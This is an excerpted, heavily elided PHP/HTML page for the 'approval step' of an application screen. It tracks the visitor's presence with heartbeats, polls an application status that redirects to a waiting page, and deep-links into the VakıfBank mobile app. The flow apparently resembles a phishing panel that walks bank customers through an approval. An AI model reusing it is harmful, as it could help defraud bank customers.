...
upsertPresence('onay', (string) $application['id'], false);
?>
<!doctype html>
<html lang="tr">
<head>
  ...
  <title>Basvuru Ekrani Onay Adimi</title>
...
<body class="app-mobile">
  <div class="app-shell">
    ...
    <main class="app-main" style="text-align:center;">
      ...
      <div style="margin-top: 30px; padding: 0 10px;">
        <button type="button" class="app-primary-btn" onclick="openVakifbankApp()" style="margin-bottom: 10px;">VakıfBank Uygulamasını Aç</button>
      </div>
    </main>
    
    <script>
      function openVakifbankApp() {
        var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
        if (isIOS) {
          window.location.href = "vakifbank://";
        } else {
          window.location.href = "intent://#Intent;package=com.vakifbank.mobile;end;";
        }
      }
    </script>
  ...
  <script>
    function sendHeartbeat() {
      fetch("heartbeat.php", {
        ...
        body: new URLSearchParams({
          screen: "onay",
          application_id: <?= json_encode((string) $application['id']) ?>
        }).toString(),
        keepalive: true
      }).catch(() => {});
    }
    ...
    const appId = <?= json_encode((string) $application['id']) ?>;
    async function checkStatus() {
      try {
        ...
        if (data.status === "beklemede") {
          window.location.href = `waiting.php?id=${encodeURIComponent(appId)}`;
          return;
        }
